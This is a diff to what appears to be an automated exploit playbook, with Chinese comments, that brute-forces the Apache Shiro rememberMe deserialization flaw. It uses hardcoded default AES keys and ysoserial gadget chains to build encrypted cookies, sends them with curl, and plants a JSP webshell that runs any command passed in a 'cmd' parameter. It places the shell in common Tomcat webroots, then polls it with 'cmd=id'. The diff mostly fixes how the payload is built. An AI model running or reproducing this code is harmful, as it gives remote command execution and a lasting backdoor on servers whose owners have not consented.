@@ -155,16 +155,17 @@ exploit_paths:
           done
           if [ -z "$JAVA8" ]; then echo "[-] JDK 8 不可用"; exit 1; fi
 
-          # AES 检测
-          python3 -c "from Crypto.Cipher import AES; print('pycryptodome OK')" 2>/dev/null \
-            || python3 -c "from cryptography.hazmat.primitives.ciphers import Cipher; print('cryptography OK')" 2>/dev/null \
-            || { echo "[-] 无 AES 加密库"; exit 1; }
+          # AES 库检测
+          python3 -c "
+          try:
+              from Crypto.Cipher import AES; print('pycryptodome OK')
+          except ImportError:
+              from cryptography.hazmat.primitives.ciphers import Cipher; print('cryptography OK')
+          " 2>/dev/null || { echo "[-] 无 AES 加密库"; exit 1; }
 
-          # Webshell 内容
           SHELL_JSP='<%@page import="java.io.*"%><%Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=br.readLine())!=null)out.println(l);%>'
           SHELL_NAME="shiro_test_$(date +%s).jsp"
-          
-          # 常见 Tomcat webroot 路径
+
           WEBROOT_PATHS=(
             "/opt/tomcat/webapps/ROOT"
             "/usr/local/tomcat/webapps/ROOT"
@@ -173,7 +174,6 @@ exploit_paths:
             "/var/lib/tomcat9/webapps/ROOT"
           )
 
-          # 常见密钥（Top 10）
           KEYS=(
             "kPH+bIxk5D2deZiIxcaaaA=="
             "4AvVhmFLUs0KTA3Kprsdag=="
@@ -189,60 +189,33 @@ exploit_paths:
 
           GADGETS=("CommonsBeanutils1" "CommonsCollections2" "CommonsCollections6")
 
+          # Pre-encode webshell to base64 once (pure Bash, no nesting issues)
+          SHELL_B64=$(printf '%s' "$SHELL_JSP" | base64 -w0)
+
           echo "[*] 开始 Shiro 写 webshell 爆破"
           echo "[*] 密钥: ${#KEYS[@]} 个, Gadget: ${#GADGETS[@]} 个"
 
           TESTED=0
           for gadget in "${GADGETS[@]}"; do
-            # 预生成各路径的写文件命令 payload
             for webroot in "${WEBROOT_PATHS[@]}"; do
-              WRITE_CMD="bash -c {echo,${SHELL_JSP// /}|base64 -d > ${webroot}/${SHELL_NAME}}"
-              # 实际用 bash 写文件的命令
-              WRITE_CMD_REAL="/bin/bash -c echo+'${SHELL_JSP}'+>+'${webroot}/${SHELL_NAME}'"
-              
-              # 更可靠的写法：用 python 生成 payload 并加密发送
               for key in "${KEYS[@]}"; do
                 TESTED=$((TESTED + 1))
 
-                python3 -c "
-          import subprocess, base64, os, sys
-          # 生成 ysoserial payload
-          cmd = 'bash -c {echo,$(echo -n \"${SHELL_JSP}\" | base64 | tr -d \"\\n\")}|{base64,-d}|{tee,${webroot}/${SHELL_NAME}}'
-          proc = subprocess.run(
-              ['${JAVA8}', '-jar', '/opt/ysoserial.jar', '${gadget}', cmd],
-              capture_output=True, timeout=15
-          )
-          if proc.returncode != 0 or len(proc.stdout) < 50:
-              sys.exit(1)
-          payload = proc.stdout
+                # Build the write command: decode b64 webshell into target path
+                WRITE_CMD="/bin/bash -c {echo,${SHELL_B64}}|{base64,-d}|{tee,${webroot}/${SHELL_NAME}}"
 
-          # AES-CBC 加密
-          key = base64.b64decode('${key}')
-          iv = os.urandom(16)
-          pad_len = 16 - (len(payload) % 16)
-          padded = payload + bytes([pad_len] * pad_len)
-          try:
-              from Crypto.Cipher import AES
-              ct = AES.new(key, AES.MODE_CBC, iv).encrypt(padded)
-          except ImportError:
-              from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-              c = Cipher(algorithms.AES(key), modes.CBC(iv))
-              enc = c.encryptor()
-              ct = enc.update(padded) + enc.finalize()
-          cookie = base64.b64encode(iv + ct).decode()
-          print(cookie)
-          " 2>/dev/null
-                COOKIE=$(python3 -c "
+                # Generate ysoserial payload, AES-encrypt, and output base64 cookie
+                COOKIE=$(python3 - "$JAVA8" "$gadget" "$WRITE_CMD" "$key" <<'PYEOF'
           import subprocess, base64, os, sys
-          cmd = '/bin/bash####-c####echo ${SHELL_JSP} > ${webroot}/${SHELL_NAME}'.replace('####', chr(32))
+          java8, gadget, cmd, key_b64 = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
           proc = subprocess.run(
-              ['${JAVA8}', '-jar', '/opt/ysoserial.jar', '${gadget}', cmd],
+              [java8, '-jar', '/opt/ysoserial.jar', gadget, cmd],
               capture_output=True, timeout=15
           )
           if proc.returncode != 0 or len(proc.stdout) < 50:
               sys.exit(1)
           payload = proc.stdout
-          key = base64.b64decode('${key}')
+          key = base64.b64decode(key_b64)
           iv = os.urandom(16)
           pad_len = 16 - (len(payload) % 16)
           padded = payload + bytes([pad_len] * pad_len)
@@ -251,20 +224,18 @@ exploit_paths:
               ct = AES.new(key, AES.MODE_CBC, iv).encrypt(padded)
           except ImportError:
               from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-              c = Cipher(algorithms.AES(key), modes.CBC(iv))
-              enc = c.encryptor()
+              enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
               ct = enc.update(padded) + enc.finalize()
           print(base64.b64encode(iv + ct).decode())
-          " 2>/dev/null)
+          PYEOF
+          ) 2>/dev/null
 
                 if [ -z "$COOKIE" ]; then continue; fi
 
-                # 发送
-                curl -s -o /dev/null "${ENDPOINT}" \
+                curl -s -o /dev/null "$ENDPOINT" \
                   -H "Cookie: rememberMe=${COOKIE}" \
                   --max-time 8 2>/dev/null || true
 
-                # 每 5 组合检查一次 webshell
                 if [ $((TESTED % 5)) -eq 0 ]; then
                   sleep 1
                   RESP=$(curl -s "${ENDPOINT}/${SHELL_NAME}?cmd=id" --max-time 5 2>/dev/null || true)
@@ -285,7 +256,6 @@ exploit_paths:
                 [ $((TESTED % 20)) -eq 0 ] && echo "    进度: $TESTED (${gadget} × ${key:0:12}...)"
               done
 
-              # 每个 webroot 路径试完检查一次
               sleep 1
               RESP=$(curl -s "${ENDPOINT}/${SHELL_NAME}?cmd=id" --max-time 5 2>/dev/null || true)
               if echo "$RESP" | grep -q "uid="; then
